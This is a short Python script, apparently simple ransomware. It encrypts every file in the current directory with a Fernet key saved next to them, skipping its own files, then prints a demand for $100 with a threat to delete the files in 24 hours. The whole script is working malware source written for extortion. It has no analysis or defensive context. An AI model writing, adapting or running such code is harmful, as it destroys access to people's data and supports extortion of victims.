from cryptography.fernet import Fernet
import os

# Define the function isEncrypted to check whether the file is encrypted with the given key.
def isEncrypted(filePath, key):
    with open(filePath, 'rb') as file:
        firstLine = file.readline()

        try:
            # Attempt to decrypt the first line using Fernet
            Fernet(key).decrypt(firstLine)
            return True
        except Exception as e:
            return False


keyFile = "encryptedKey.key"
if not os.path.exists(keyFile):
    key = Fernet.generate_key()
    with open(keyFile, "wb") as encryptedKey:
        encryptedKey.write(key)
else:
    with open(keyFile, "rb") as encryptedKey:
        key = encryptedKey.read()


files = []

for path in os.listdir():
    if (path == "main.py" or path == "encryptedKey.key" or path == "decrypt.py"):
        continue
    if os.path.isfile(path):
        files.append(path)

for file in files:
    # Check the file is already encrypted or not.
    encrypted = isEncrypted(file, key)
    if (not encrypted):
        with open(file, "rb") as file1:
            rawData = file1.read()
        encryptedRawData = Fernet(key).encrypt(rawData)
        with open(file, "wb") as file2:
            file2.write(encryptedRawData)
            file2.close()

        print("👹👹👹👹 All of your files has been encrypted send me $100 or I'll delete them in 24 hours!! 👹👹👹👹")
